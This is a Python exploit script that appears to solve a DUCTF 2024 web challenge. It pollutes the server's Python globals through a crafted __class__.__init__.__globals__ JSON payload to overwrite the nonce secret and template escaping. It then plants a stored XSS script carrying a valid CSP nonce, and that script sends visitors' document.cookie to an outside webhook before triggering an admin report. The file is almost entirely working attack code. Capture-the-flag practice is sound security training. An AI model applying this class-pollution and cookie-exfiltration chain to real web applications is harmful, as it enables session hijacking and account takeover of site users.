#! /usr/bin/env python3
import requests
import json
from hashlib import sha256

def main(webhook: str):
    if webhook.endswith("/"):
        print("[-]Webhook should not end with \"/\", it will affect the payload")
        exit()
    else:
        print("[+]Webhook check pass")
    #creating an account
    url ="https://web-co2v2-c2e887299d41827c.2024.ductf.dev/"
    req = requests.session()
    #register details
    data1 = {"username":"z","password":"z"}
    req.post(url+"register",data=data1)
    req.post(url+"login",data=data1)
    #Python class Pollution
    headers = {"Content-Type":"application/json"}
    data2 = {"__class__":{"__init__":{"__globals__":{"SECRET_NONCE":"z","RANDOM_COUNT":0,"TEMPLATES_ESCAPE_ALL":False}}}}
    pollution_result = req.post(url+"save_feedback",data=json.dumps(data2),headers=headers).text
    if json.loads(pollution_result)["success"] == "true":
        print("[+]Classes Successfully polluted")
    else:
        print("[+] Error")
    #Implementing false Template_Escape_all at /admin/update-accepted-templates
    data3 = {"policy": "strict"}
    template_escape_result = req.post(url+"admin/update-accepted-templates",headers=headers,data=json.dumps(data3)).text
    if json.loads(template_escape_result)["success"] == "true":
       print("[+]Successfully implemented")
    else:
       print("[+] Error")
    #Creating index page nonce
    nonce = sha256(b'z'+b'/'+b'').hexdigest()
    print(f"[+]Index page's nonce: {nonce}")
    payload = f"<script nonce=\"{nonce}\">fetch(\"{webhook}/\"+\"?cookie=\"+document.cookie);</script>"
    print(payload)
    data4 = {"title":payload,"content":"XSS Script","public":1}
    #Submitting payload to route /create_post
    req.post(url+"create_post",data=data4)
    #reporting link
    print("[+]Submit details: "+requests.get(url+"api/v1/report").text)


if __name__ == "__main__":
    main("https://www.postb.in/1723464215787-0882624909281")
    
